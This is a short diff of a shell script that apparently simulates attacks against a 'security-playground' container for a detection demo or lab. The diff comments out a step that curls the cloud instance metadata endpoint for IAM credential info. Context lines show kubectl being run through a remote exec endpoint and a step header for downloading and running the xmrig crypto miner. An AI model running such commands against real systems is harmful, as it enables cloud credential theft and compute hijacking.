@@ -70,11 +70,11 @@ curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=./kubectl get pods'
 echo "--------------------------------------------------------------------------------"
 sleep 10
 
-echo "9. Call the Node's Instance Metadata Endpoint from the security-playground container"
-echo "--------------------------------------------------------------------------------"
-curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl curl http://169.254.169.254/latest/meta-data/iam/info'
-echo "--------------------------------------------------------------------------------"
-sleep 10
+#echo "9. Call the Node's Instance Metadata Endpoint from the security-playground container"
+#echo "--------------------------------------------------------------------------------"
+#curl -X POST $NODE_IP:$NODE_PORT/exec -d 'command=curl curl http://169.254.169.254/latest/meta-data/iam/info'
+#echo "--------------------------------------------------------------------------------"
+#sleep 10
 
 echo "10. Download and run a common crypto miner (xmrig)"
 echo "--------------------------------------------------------------------------------"
